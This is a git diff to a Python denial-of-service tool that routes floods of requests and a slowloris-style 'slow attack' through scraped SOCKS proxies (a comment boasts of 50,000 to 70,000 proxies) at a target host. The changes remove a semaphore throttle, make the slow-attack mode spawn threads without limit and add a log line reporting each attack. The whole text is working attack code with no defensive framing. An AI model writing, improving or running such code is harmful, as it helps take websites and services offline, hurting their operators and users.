@@ -330,13 +330,14 @@ def ProxyScraper(): # 抓取proxy的 , 用了無數次 可以肯定的說 50~70k
 def launchThreads():
     for _ in range(thr):
         try:
-            if "--slow" in sys.argv:
-                t = threading.Thread(target=send_dsyn)
-            else:
-                t = threading.Thread(target=send_requests)
-            t.start()
+            threading.Thread(target=send_requests, daemon=True).start()
         except:
             pass
+
+
+def launchSLOW():
+    while 1:
+        threading.Thread(target=send_dsyn, daemon=True).start()
 
 
 def send_dsyn():
@@ -345,7 +346,6 @@ def send_dsyn():
         proxy_port = int(proxy_port)
     except ValueError:
         return
-    sema.acquire()
     while 1:
         try:
             s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
@@ -364,6 +364,7 @@ def send_dsyn():
                     hd += 1
                     s.send(f"{hd}".encode())
                     time.sleep(15)
+                    print(f"[ProxyDDoS] Proxy : {proxy_ip} Slow Attack -> {host}")
             except:
                 s.close()
         except:
@@ -453,4 +454,10 @@ if __name__ == '__main__':
             f.write(f"{l}\n")
         f.close()
         launchChecker()
-        launchThreads()
+        if "--slow" in sys.argv:
+            launchSLOW()
+        else:
+            launchThreads()
+        while not KeyboardInterrupt:
+            input()
+        exit()
